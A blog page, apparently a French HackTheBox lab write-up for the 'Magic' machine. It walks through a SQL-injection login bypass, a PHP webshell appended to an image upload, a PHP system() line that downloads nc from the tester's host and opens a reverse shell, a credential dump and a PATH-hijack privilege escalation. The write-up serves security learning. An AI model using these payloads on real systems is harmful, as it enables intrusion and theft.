@@ -1,0 +1,1591 @@
+<!DOCTYPE HTML>
+
+<html>
+    <head>
+        <script type="application/ld+json">
+    {
+        "@context" : "http://schema.org",
+        "@type" : "BlogPosting",
+        "mainEntityOfPage": {
+             "@type": "WebPage",
+             "@id": "\/"
+        },
+        "articleSection" : "blog-fr",
+        "name" : "Magic",
+        "headline" : "Magic",
+        "description" : "HackTheBox",
+        "inLanguage" : "en",
+        "author" : "",
+        "creator" : "",
+        "publisher": "",
+        "accountablePerson" : "",
+        "copyrightHolder" : "",
+        "copyrightYear" : "2020",
+        "datePublished": "2020-08-03 00:00:00 \x2b0000 UTC",
+        "dateModified" : "2020-08-03 00:00:00 \x2b0000 UTC",
+        "url" : "\/blog-fr\/hackthebox\/magic\/",
+        "wordCount" : "951",
+        "keywords" : [ "Blog" ]
+    }
+    </script>
+        
+            
+                <title>Magic</title>
+            
+        
+
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <meta name="generator" content="Hugo 0.68.3" />
+        
+
+
+        
+            <meta name="author" content="AlrikRr">
+        
+        
+            <meta name="description" content="HackTheBox">
+        
+
+        <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Magic"/>
+<meta name="twitter:description" content="HackTheBox"/>
+<meta name="twitter:site" content="@AlrikRr"/>
+
+        <meta property="og:title" content="Magic" />
+<meta property="og:description" content="HackTheBox" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/blog-fr/hackthebox/magic/" />
+<meta property="article:published_time" content="2020-08-03T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-08-03T00:00:00+00:00" />
+
+        <meta property="og:image" content="//images/logo.png">
+        <meta property="og:image:type" content="image/png">
+        <meta property="og:image:width" content="512">
+        <meta property="og:image:height" content="512">
+        <meta itemprop="name" content="Magic">
+<meta itemprop="description" content="HackTheBox">
+<meta itemprop="datePublished" content="2020-08-03T00:00:00&#43;00:00" />
+<meta itemprop="dateModified" content="2020-08-03T00:00:00&#43;00:00" />
+<meta itemprop="wordCount" content="951">
+
+
+
+<meta itemprop="keywords" content="" />
+        
+
+        
+            
+        
+
+        
+        
+            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">
+            <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Raleway:400,800,900|Source+Sans+Pro:400,700">
+            <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.1.25/jquery.fancybox.min.css">
+            <link rel="stylesheet" href="/css/main.css">
+            <link rel="stylesheet" href="/css/add-on.css">
+            <link rel="stylesheet" href="/css/academicons.min.css">
+	    <link disabled id="dark-mode-theme" rel="stylesheet" href="/css/dark.css">
+        
+
+        
+            
+                
+            
+        
+
+
+  
+    
+    <link href='//cdn.bootcss.com/highlight.js/9.11.0/styles/github.min.css' rel='stylesheet' type='text/css' />
+  
+
+
+      
+    </head>
+    <body>
+
+      
+      <div id="wrapper">
+
+    
+    
+<header id="header">
+    
+      <h1><a href="/">blog-fr</a></h1>
+    
+
+    <nav class="links">
+        <ul>
+            
+                <li>
+                    <a href="/blog-fr/">
+                            <i class="">&nbsp;</i>🇫🇷 Blog
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/blog-en/">
+                            <i class="">&nbsp;</i>🇬🇧 Blog
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/projects/">
+                            <i class="fa fa-list">&nbsp;</i>Projects
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/categories/">
+                            <i class="fa fa-folder">&nbsp;</i>Categories
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/about/">
+                            <i class="">&nbsp;</i>👺 My resume
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="https://www.levulgarisateurnumerique.com/">
+                            <i class="">&nbsp;</i>🦊 LeVulgaNum ⇢
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="https://secforall.org/">
+                            <i class="">&nbsp;</i>🕵️ SecForAll ⇢
+                    </a>
+                </li>
+            
+        </ul>
+    </nav>
+    <nav class="main">
+        <ul>
+            
+            <li id="share-nav" class="share-menu" style="display:none;">
+                <a class="fa-share-alt" href="#share-menu">Share</a>
+            </li>
+            
+            <li>
+	 <a id="dark-mode-toggle" class="fal fa-moon-o">Dark Mode</a>
+            </li>
+            <li class="menu">
+                <a class="fa-bars" href="#menu">Menu</a>
+            </li>
+        </ul>
+    </nav>
+
+	<script>
+var toggle = document.getElementById("dark-mode-toggle");
+var darkTheme = document.getElementById("dark-mode-theme");
+var savedTheme = localStorage.getItem("dark-mode-storage") || "light";
+setTheme(savedTheme);
+
+toggle.addEventListener("click", () => {
+    if (toggle.className === "fal fa-moon-o") {
+        setTheme("dark");
+    } else if (toggle.className === "fal fa-sun-o") {
+        setTheme("light");
+    }
+});
+
+function setTheme(mode) {
+	    localStorage.setItem("dark-mode-storage", mode);
+    if (mode === "dark") {
+        darkTheme.disabled = false;
+        toggle.className = "fal fa-sun-o";
+    } else if (mode === "light") {
+        darkTheme.disabled = true;
+        toggle.className = "fal fa-moon-o";
+    }
+}
+	</script>
+
+</header>
+
+
+<section id="menu">
+
+    
+        <section>
+            <form class="search" method="get" action="//google.com/search">
+                <input type="text" name="q" placeholder="Search" />
+                <input type="hidden" name="as_sitesearch" value="/">
+            </form>
+        </section>
+
+    
+        <section>
+            <ul class="links">
+                
+                    <li>
+                        <a href="/blog-fr/">
+                            <h3>
+                                <i class="">&nbsp;</i>🇫🇷 Blog
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/blog-en/">
+                            <h3>
+                                <i class="">&nbsp;</i>🇬🇧 Blog
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/projects/">
+                            <h3>
+                                <i class="fa fa-list">&nbsp;</i>Projects
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/categories/">
+                            <h3>
+                                <i class="fa fa-folder">&nbsp;</i>Categories
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="/about/">
+                            <h3>
+                                <i class="">&nbsp;</i>👺 My resume
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="https://www.levulgarisateurnumerique.com/">
+                            <h3>
+                                <i class="">&nbsp;</i>🦊 LeVulgaNum ⇢
+                            </h3>
+                        </a>
+                    </li>
+                
+                    <li>
+                        <a href="https://secforall.org/">
+                            <h3>
+                                <i class="">&nbsp;</i>🕵️ SecForAll ⇢
+                            </h3>
+                        </a>
+                    </li>
+                
+            </ul>
+        </section>
+
+    
+        <section class="recent-posts">
+            <div class="mini-posts">
+                <header>
+                    <h3>Recent Posts</h3>
+                </header>
+                
+
+                
+                    
+                
+
+                
+                        <article class="mini-post">
+                            <header>
+                                <h3><a href="/blog-fr/iot/p4wnp1-rubberducky/">🇫🇷  #2 P4wnP1:ALOA RubberDucky</a></h3>
+                                
+                                <time class="published" datetime=
+                                    '2020-11-18'>
+                                    November 18, 2020</time>
+                            </header>
+                            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/iot/p4wnp1-rubberducky/" class="image featured">
+            <img src="/img//iot/P4-RubberDucky/P4wnP1-rubberducky-banner.png" alt="">
+        </a>
+    
+
+
+                        </article>
+                
+                        <article class="mini-post">
+                            <header>
+                                <h3><a href="/blog-fr/iot/p4wnp1-installation/">🇫🇷  #1 P4wnP1:ALOA Installation</a></h3>
+                                
+                                <time class="published" datetime=
+                                    '2020-11-11'>
+                                    November 11, 2020</time>
+                            </header>
+                            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/iot/p4wnp1-installation/" class="image featured">
+            <img src="/img//iot/P4/P4wnP1-install-banner.png" alt="">
+        </a>
+    
+
+
+                        </article>
+                
+                        <article class="mini-post">
+                            <header>
+                                <h3><a href="/blog-fr/binary/6-ret2libc/">🇫🇷  Ret2libc avec protection NX</a></h3>
+                                
+                                <time class="published" datetime=
+                                    '2020-09-18'>
+                                    September 18, 2020</time>
+                            </header>
+                            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/binary/6-ret2libc/" class="image featured">
+            <img src="/img//binary/6-ret2lib-banner.png" alt="">
+        </a>
+    
+
+
+                        </article>
+                
+                        <article class="mini-post">
+                            <header>
+                                <h3><a href="/blog-fr/binary/5-ret2win/">🇫🇷  ROP32 sans protection</a></h3>
+                                
+                                <time class="published" datetime=
+                                    '2020-09-15'>
+                                    September 15, 2020</time>
+                            </header>
+                            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/binary/5-ret2win/" class="image featured">
+            <img src="/img//binary/5-ret2win-binary.png" alt="">
+        </a>
+    
+
+
+                        </article>
+                
+                        <article class="mini-post">
+                            <header>
+                                <h3><a href="/blog-fr/archlinux/arch-postinstall/">🇫🇷  Archlinux Post-Install !</a></h3>
+                                
+                                <time class="published" datetime=
+                                    '2020-09-14'>
+                                    September 14, 2020</time>
+                            </header>
+                            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/archlinux/arch-postinstall/" class="image featured">
+            <img src="/img//arch/arch-post/arch-banner.png" alt="">
+        </a>
+    
+
+
+                        </article>
+                
+                        <article class="mini-post">
+                            <header>
+                                <h3><a href="/blog-fr/binary/4-bufferoverflow/">🇫🇷  BufferOverflow 32bits sans protection</a></h3>
+                                
+                                <time class="published" datetime=
+                                    '2020-09-12'>
+                                    September 12, 2020</time>
+                            </header>
+                            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/binary/4-bufferoverflow/" class="image featured">
+            <img src="/img//binary/4-binary-bufferoverflow.png" alt="">
+        </a>
+    
+
+
+                        </article>
+                
+
+                
+                    <a href=
+                        
+                            /blog/
+                        
+                        class="button">View more posts</a>
+                
+            </div>
+        </section>
+
+    
+        
+</section>
+
+    <section id="share-menu">
+    <section id="social-share-nav">
+        <ul class="links">
+            <header>
+                <h3>Share this post <i class="fa fa-smile-o"></i></h3>
+            </header>
+            
+
+
+
+<li>
+  <a href="//twitter.com/share?url=%2fblog-fr%2fhackthebox%2fmagic%2f&amp;text=Magic&amp;via=AlrikRr" target="_blank" class="share-btn twitter">
+    <i class="fa fa-twitter"></i>
+    <p>Twitter</p>
+    </a>
+</li>
+
+
+
+
+
+
+
+
+
+
+<li>
+  <a href="//reddit.com/submit?url=%2fblog-fr%2fhackthebox%2fmagic%2f&amp;title=Magic" target="_blank" class="share-btn reddit">
+    <i class="fa fa-reddit-alien"></i>
+    <p>Reddit</p>
+  </a>
+</li>
+
+
+
+
+<li>
+  <a href="//www.linkedin.com/shareArticle?url=%2fblog-fr%2fhackthebox%2fmagic%2f&amp;title=Magic" target="_blank" class="share-btn linkedin">
+      <i class="fa fa-linkedin"></i>
+      <p>LinkedIn</p>
+    </a>
+</li>
+
+
+
+
+
+
+
+
+
+
+
+        </ul>
+    </section>
+</section>
+
+    
+    <div id="main">
+        
+        
+        <article class="post">
+  <header>
+    <div class="title">
+        
+            <h1><a href="/blog-fr/hackthebox/magic/">Magic</a></h1>
+            
+        
+        
+            <p>HackTheBox</p>
+        
+    </div>
+    <div class="meta">
+        
+
+        <time class="published"
+            datetime='2020-08-03'>
+            August 3, 2020</time>
+        <span class="author">AlrikRr</span>
+        
+            <p>5 minute read</p>
+        
+        
+    </div>
+</header>
+
+
+  
+    <section id="social-share">
+      <ul class="icons">
+        
+
+
+
+<li>
+  <a href="//twitter.com/share?url=%2fblog-fr%2fhackthebox%2fmagic%2f&amp;text=Magic&amp;via=AlrikRr" target="_blank" class="share-btn twitter">
+    <i class="fa fa-twitter"></i>
+    <p>Twitter</p>
+    </a>
+</li>
+
+
+
+
+
+
+
+
+
+
+<li>
+  <a href="//reddit.com/submit?url=%2fblog-fr%2fhackthebox%2fmagic%2f&amp;title=Magic" target="_blank" class="share-btn reddit">
+    <i class="fa fa-reddit-alien"></i>
+    <p>Reddit</p>
+  </a>
+</li>
+
+
+
+
+<li>
+  <a href="//www.linkedin.com/shareArticle?url=%2fblog-fr%2fhackthebox%2fmagic%2f&amp;title=Magic" target="_blank" class="share-btn linkedin">
+      <i class="fa fa-linkedin"></i>
+      <p>LinkedIn</p>
+    </a>
+</li>
+
+
+
+
+
+
+
+
+
+
+
+      </ul>
+    </section>
+  
+
+  
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/hackthebox/magic/" class="image featured">
+            <img src="/img//writeup/magic/htb-magic.png" alt="">
+        </a>
+    
+
+
+  <div id="content">
+    <p><img src="/img/writeup/magic/magic.png" alt="Magic"></p>
+<p>Hello, bienvenue sur mon Write-Up de la machine Magic , ma première box medium !</p>
+<p>C&rsquo;est une box très intéressante et assez réaliste !</p>
+<p>Bonne lecture !</p>
+<hr>
+<h2 id="tools">Tools</h2>
+<ul>
+<li>Kali linux 2020 + Tous les outils</li>
+<li>ZSH pour le shell</li>
+<li>Virtualbox pour la machine Kali</li>
+</ul>
+<h2 id="nmap">NMAP</h2>
+<p>On commence par un <code>nmap</code> pour voir les ports ouvert et commencer notre énumération.</p>
+<p><code>~ ヤマト» sudo nmap -v -sS -A -Pn -T5  10.10.10.185</code></p>
+<p><img src="/img/writeup/magic/nmap.png" alt="NMAP"></p>
+<ul>
+<li>Port 22 ouvert, OpenSSH 7.6p1 &ndash;&gt; il y aura surement moyen d&rsquo;avoir un accès SSH</li>
+<li>Port 80 Ouvert, Apache/2.4.29</li>
+</ul>
+<h2 id="site-web">Site Web</h2>
+<p>Pour le site web il s&rsquo;agit d&rsquo;un portfolio d&rsquo;images.
+Une page de <strong>login</strong> est accessible à cette adresse : <code>http://10.10.10.185/login.php</code></p>
+<p>Contournement de l&rsquo;authetification très simple grace à une <strong>injection SQL</strong></p>
+<ul>
+<li>login : <code>admin' OR 1 = 1;</code></li>
+<li>pass : <code>admin' OR 1 = 1;</code></li>
+</ul>
+<p><img src="/img/writeup/magic/upload.png" alt="upload"></p>
+<p>Nous avons maintenant accès à la page <code>upload.php</code> qui nous permet d&rsquo;upload une image dans la galerie. On va tester ça avec une simple image.</p>
+<p>Notre image ce trouve à l&rsquo;adresse suivante : <code>http://10.10.10.185/images/uploads/luffy.png</code></p>
+<p>Maintenant, essayons en changeant l&rsquo;extension par <code>luffy.php.png</code>.</p>
+<p><img src="/img/writeup/magic/php_png.png" alt="php_png"></p>
+<p>Il est donc possible d&rsquo;upload des image en <code>php.png</code> sans contrainte et ensuite de les afficher, maintenant essayons en y ajoutant un webshell php.</p>
+<p><a href="https://github.com/artyuum/Simple-PHP-Web-Shell/blob/master/index.php">https://github.com/artyuum/Simple-PHP-Web-Shell/blob/master/index.php</a></p>
+<p>BON ca ne fonctionne pas très bien avec seulement du PHP.</p>
+<p><img src="/img/writeup/magic/erro.png" alt="Erro"></p>
+<p>Je pense qu&rsquo;il y a une lecture du fichier et si un caractère du style &ldquo;&lt;&rdquo; se trouve dans le fichier, il y a une exeption.</p>
+<p>J&rsquo;ai pu faire un test avec un simple fichier <code>hello.php.png</code> qui contient seulement <code>&lt;H1&gt;Hello&lt;/H1&gt;</code> celui-ci retourne la même erreur.</p>
+<p>Et si je mettais mon code PHP à la fin de mon image ?</p>
+<p>Effectivement, ca fonctionne en laissant l&rsquo;image comme elle est et en ajoutant notre webshell à la fin.</p>
+<p><a href="https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985">Un autre webshell que j&rsquo;utilise ICI</a></p>
+<p><img src="/img/writeup/magic/webshell.png" alt="webshell"></p>
+<h2 id="enumeration">Enumeration</h2>
+<pre><code class="language-bash/shell" data-lang="bash/shell">$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre><p>Maintenant que j&rsquo;ai un accès à la machine, il faut commencer l'énumération pour avoir un accès <strong>ROOT</strong>.</p>
+<p><strong>db.php5</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">getMessage());
+            }
+        }
+        return self::$cont;
+    }
+
+    public static function disconnect()
+    {
+        self::$cont = null;
+    }
+}
+</code></pre></div><p>Un fichier assez étrange.</p>
+<p><strong>upload.php</strong>
+<img src="/img/writeup/magic/upload_php.png" alt="upload_php">
+Comme je le disais, on peut voir ici le check sur les caractères &ldquo;&lt;&rdquo;.</p>
+<p><strong>login.php</strong>
+<img src="/img/writeup/magic/login_php.png" alt="login_php"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ls /home
+theseus
+</code></pre></div><p>Il y a un utilisateur, <strong>theseus</strong>.</p>
+<p><strong>.htaccess</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">SetHandler application/x-httpd-php
+
+
+   order deny,allow
+   deny from all
+</code></pre></div><p>Un fichier <code>.htaccess</code> mais qui ne nous apprends rien.</p>
+<h2 id="changement-de-webshell">Changement de webshell</h2>
+<p>Ok après réflexion, j&rsquo;ai changé de webshell et le résultat est beaucoup mieux , j&rsquo;ai repris le premier webshell.</p>
+<p><img src="/img/writeup/magic/db_php5.png" alt="db_php5">
+Je peux maintenant voir le fichier <strong>db.php5</strong> en entier.</p>
+<p>Et on y vois des choses très intéressantes !</p>
+<p>J&rsquo;ai un login et un mdp :</p>
+<ul>
+<li>login : <code>theseus</code></li>
+<li>mdp : <code>iamkingtheseus</code><br>
+SSH ne fonctionne pas, problème de clé publique.</li>
+</ul>
+<h2 id="road-to-user">Road to USER</h2>
+<p>Bon, je vais essayé d&rsquo;avoir un meilleur shell en utilisant <code>nc</code>.</p>
+<p>J&rsquo;ai fait une copie du binaire dans un dossier puis j&rsquo;ai ensuite démarrer un serveur python pour pouvoir y accéder à distance.</p>
+<p><code>wget http://10.10.14.7/nc -P /tmp/ &amp;&amp; chmod +x /tmp/nc &amp;&amp; /tmp/./nc 10.10.14.7 8888 -e /bin/bash</code></p>
+<p>Malheureusement cette commande ne fonctionne pas dans le webshell, je vais essayé de la faire executer dans une image comme le webshell.</p>
+<p>J&rsquo;ai refais un <code>luffy.php.png</code> avec à la fin <code>&lt;?php system(&quot;wget http://10.10.14.7:8000/nc &amp;&amp; chmod +x nc &amp;&amp; ./nc 10.10.14.7 8888 -e /bin/bash&quot;); ?&gt;</code></p>
+<p><img src="/img/writeup/magic/nc.png" alt="nc"></p>
+<p>Bien !</p>
+<p>On fait spawn un <code>/bin/bash</code> avec <code>python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p>
+<p>On peut voir qu&rsquo;une base de donnée <strong>mysql</strong> est utilisée, mais que le binaire <strong>mysql</strong> n&rsquo;existe pas.</p>
+<p><img src="/img/writeup/magic/mysql.png" alt="mysql"></p>
+<p>En faisant un <code>ls /usr/bin/mysql*</code> on peut voir d&rsquo;autre binaire mysql.</p>
+<p>Un petit tuto <a href="https://www.geek-directeur-technique.com/2017/07/17/utilisation-de-mysqldump">ICI</a> pour utiliser  <code>mysqldump</code>.</p>
+<p>Je me suis intéréssé à ce binaire car je cherche ç faire un dump de la base de donnée avec les creds que j&rsquo;ai trouvé dans <code>db.php5</code>.</p>
+<p>Avec la commande : <code>mysqldump -u theseus -p Magic &gt; /tmp/base.sql</code></p>
+<p>On peut récupérer la base de donnée <strong>base.sql</strong> dans <code>/tmp</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"> <span style="color:#75715e">/*!40000 ALTER TABLE `login` DISABLE KEYS */</span>;
+<span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> <span style="color:#f92672">`</span>login<span style="color:#f92672">`</span> <span style="color:#66d9ef">VALUES</span> (<span style="color:#ae81ff">1</span>,<span style="color:#e6db74">&#39;admin&#39;</span>,<span style="color:#e6db74">&#39;Th3s3usW4sK1ng&#39;</span>);
+</code></pre></div><p>Nous avoila avec un autre mot de passe, on va tout de suite l&rsquo;utiliser avec le compte <strong>theseus</strong> !</p>
+<p><img src="/img/writeup/magic/theseus.png" alt="theseus"></p>
+<p>Et nous voila USER !</p>
+<p>J&rsquo;en ai profité pour mettre ma clé publique SSH dans le fichier <code>.ssh/autorized_keys</code> afin d&rsquo;avoir un accés SSH à tout moment.</p>
+<h2 id="road-to-root">Road to ROOT</h2>
+<p>On va refaire une énumération mais cette fois en utilisant <a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">LinEnum</a></p>
+<p>A première vue, rien ne me saute au yeux dans le rapport <strong>linenum</strong>.</p>
+<h2 id="suid">SUID</h2>
+<p>Après avoir quelques heures d'énumération, je décide de regarder les binaire exploitable avec la commande <code> find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \;</code></p>
+<pre><code class="language-bash/shell" data-lang="bash/shell">-rwsr-xr-x 1 root root 26696 Jan  8  2020 /bin/umount
+-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
+-rwsr-x--- 1 root users 22040 Oct 21  2019 /bin/sysinfo
+-rwsr-xr-x 1 root root 43088 Jan  8  2020 /bin/mount
+-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
+-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
+</code></pre><p>Je tombe sur le même résultat que linenum mais cette fois-ci , ca me saute au yeux !
+Le binaire <code>/bin/sysinfo</code> appartient aussi au groupe <strong>users</strong> mais est executé par le compte <strong>root</strong> !</p>
+<p>De plus ce binaire peut-être executé par notre compte <strong>user</strong> !</p>
+<h2 id="cve-">CVE ?</h2>
+<p>On regarde les CVE sur le binaire <code>sysinfo</code>.</p>
+<p>Je tombe sur cette CVE :</p>
+<ul>
+<li><a href="https://www.cvedetails.com/cve/CVE-2017-6516/">https://www.cvedetails.com/cve/CVE-2017-6516/</a></li>
+<li><a href="https://www.exploit-db.com/exploits/44150">https://www.exploit-db.com/exploits/44150</a></li>
+</ul>
+<p>Mais après quelques tentatives, j&rsquo;ai abandonné l&rsquo;idée d&rsquo;utiliser une CVE.</p>
+<h2 id="path-exploit">PATH exploit</h2>
+<p>En regardant de plus près, le binaire <code>sysinfo</code> executer une commande familière.</p>
+<p><img src="/img/writeup/magic/free.png" alt="free"></p>
+<p>L&rsquo;output ressemble beaucoup à la commande <code>free</code>.</p>
+<p>L&rsquo;idée serait de faire executer une fausse commande <code>free</code> à <code>sysinfo</code> afin de faire executer une commande au compte <strong>root</strong>.</p>
+<p><strong>Création de l&rsquo;exploit</strong>
+<img src="/img/writeup/magic/exploit_free.png" alt="exploit_free"></p>
+<p><strong>Modification du PATH</strong>
+<img src="/img/writeup/magic/path_free.png" alt="path_free">
+Il faut mettre le <code>/tmp</code> au début du <strong>PATH</strong> comme ça c&rsquo;est ici que le système va cherche des binaires en premier.</p>
+<p><img src="/img/writeup/magic/nc_root.png" alt="nc_root"></p>
+<p>BINGO nous voila avec un accès <strong>ROOT</strong> !</p>
+
+  </div>
+
+  <footer>
+    <ul class="stats">
+  <li class="categories">
+    <ul>
+        
+            
+            
+                <i class="fa fa-folder"></i>
+                
+                
+                <li><a class="article-category-link" href="/categories/hackthebox">HackTheBox</a></li>
+                
+            
+        
+    </ul>
+  </li>
+  <li class="tags">
+    <ul>
+        
+    </ul>
+  </li>
+</ul>
+
+  </footer>
+
+</article>
+
+
+<ul class="actions pagination">
+    
+        <li><a href="/blog-fr/hackthebox/remote/"
+                class="button big previous">Remote</a></li>
+    
+
+    
+        <li><a href="/blog-fr/iot/basic-installation/"
+                class="button big next">🇫🇷  Installation Simple et Sécurisée de Raspbian OS (Lite)</a></li>
+    
+</ul>
+
+
+    </div>
+    
+<section id="sidebar">
+
+  
+  <section id="intro">
+    
+    
+      
+        <a href='/'><img src="/img/main/logo.jpg" class="intro-circle" width="250" alt="AlrikRr" /></a>
+      
+    
+    
+      <header>
+        <h2>Hello, friend.</h2>
+        <p>The greatest enemy of knowledge is not ignorance, it is the illusion of knowledge.</p>
+      </header>
+    
+    
+      <ul class="icons">
+        
+          
+    <li><a href="/index.xml" type="application/rss+xml" target="_blank" title="RSS" class="fa fa-rss"></a></li>
+
+
+        
+        
+  <li><a href="//github.com/AlrikRr" target="_blank" title="GitHub" class="fa fa-github"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <li><a href="//linkedin.com/in/adrien-lasalle" target="_blank" title="LinkedIn" class="fa fa-linkedin"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <li><a href="//reddit.com/user/AlrikRr" target="_blank" title="Reddit" class="fa fa-reddit"></a></li>
+
+
+
+
+
+  <li><a href="//youtube.com/https://www.youtube.com/channel/UCnfAzfzPenSKIRLUCtKA4VA" target="_blank" title="YouTube" class="fa fa-youtube"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <li><a href="//twitter.com/AlrikRr" target="_blank" title="Twitter" class="fa fa-twitter"></a></li>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+      </ul>
+    
+  </section>
+
+  
+  <section class="recent-posts">
+    <div class="mini-posts">
+      <header>
+        <h3>Recent Posts</h3>
+      </header>
+      <div class="posts-container">
+        
+
+        
+          
+        
+
+        
+          <article class="mini-post">
+            <header>
+              <h3>
+                <a href="/blog-fr/iot/p4wnp1-rubberducky/">🇫🇷  #2 P4wnP1:ALOA RubberDucky</a>
+              </h3>
+              
+              <time class="published" datetime='2020-11-18'>
+                November 18, 2020
+              </time>
+            </header>
+            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/iot/p4wnp1-rubberducky/" class="image featured">
+            <img src="/img//iot/P4-RubberDucky/P4wnP1-rubberducky-banner.png" alt="">
+        </a>
+    
+
+
+          </article>
+        
+          <article class="mini-post">
+            <header>
+              <h3>
+                <a href="/blog-fr/iot/p4wnp1-installation/">🇫🇷  #1 P4wnP1:ALOA Installation</a>
+              </h3>
+              
+              <time class="published" datetime='2020-11-11'>
+                November 11, 2020
+              </time>
+            </header>
+            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/iot/p4wnp1-installation/" class="image featured">
+            <img src="/img//iot/P4/P4wnP1-install-banner.png" alt="">
+        </a>
+    
+
+
+          </article>
+        
+          <article class="mini-post">
+            <header>
+              <h3>
+                <a href="/blog-fr/binary/6-ret2libc/">🇫🇷  Ret2libc avec protection NX</a>
+              </h3>
+              
+              <time class="published" datetime='2020-09-18'>
+                September 18, 2020
+              </time>
+            </header>
+            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/binary/6-ret2libc/" class="image featured">
+            <img src="/img//binary/6-ret2lib-banner.png" alt="">
+        </a>
+    
+
+
+          </article>
+        
+          <article class="mini-post">
+            <header>
+              <h3>
+                <a href="/blog-fr/binary/5-ret2win/">🇫🇷  ROP32 sans protection</a>
+              </h3>
+              
+              <time class="published" datetime='2020-09-15'>
+                September 15, 2020
+              </time>
+            </header>
+            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/binary/5-ret2win/" class="image featured">
+            <img src="/img//binary/5-ret2win-binary.png" alt="">
+        </a>
+    
+
+
+          </article>
+        
+          <article class="mini-post">
+            <header>
+              <h3>
+                <a href="/blog-fr/archlinux/arch-postinstall/">🇫🇷  Archlinux Post-Install !</a>
+              </h3>
+              
+              <time class="published" datetime='2020-09-14'>
+                September 14, 2020
+              </time>
+            </header>
+            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/archlinux/arch-postinstall/" class="image featured">
+            <img src="/img//arch/arch-post/arch-banner.png" alt="">
+        </a>
+    
+
+
+          </article>
+        
+          <article class="mini-post">
+            <header>
+              <h3>
+                <a href="/blog-fr/binary/4-bufferoverflow/">🇫🇷  BufferOverflow 32bits sans protection</a>
+              </h3>
+              
+              <time class="published" datetime='2020-09-12'>
+                September 12, 2020
+              </time>
+            </header>
+            
+    
+
+    
+        
+        
+
+
+
+
+
+
+
+  
+
+
+        
+        
+        
+
+        <a href="/blog-fr/binary/4-bufferoverflow/" class="image featured">
+            <img src="/img//binary/4-binary-bufferoverflow.png" alt="">
+        </a>
+    
+
+
+          </article>
+        
+      </div>
+
+      
+        <a href=
+          
+            /blog/
+          
+        class="button">View more posts</a>
+      
+    </div>
+  </section>
+
+  
+  
+  
+  
+  
+    <section id="categories">
+      <header>
+        <h3>
+          <a href="/categories/">Categories</a>
+        </h3>
+      </header>
+        
+          
+        
+
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/hackthebox/">hackthebox</a>
+                <span style="float:right;">6</span>
+              
+            </header>
+          </article>
+        </p>
+        
+        <p>
+          <article>
+            <header>
+              
+                <a href="/categories/tuto/">tuto</a>
+                <span style="float:right;">6</span>
+              
+            </header>
+          </article>
+        </p>
+        
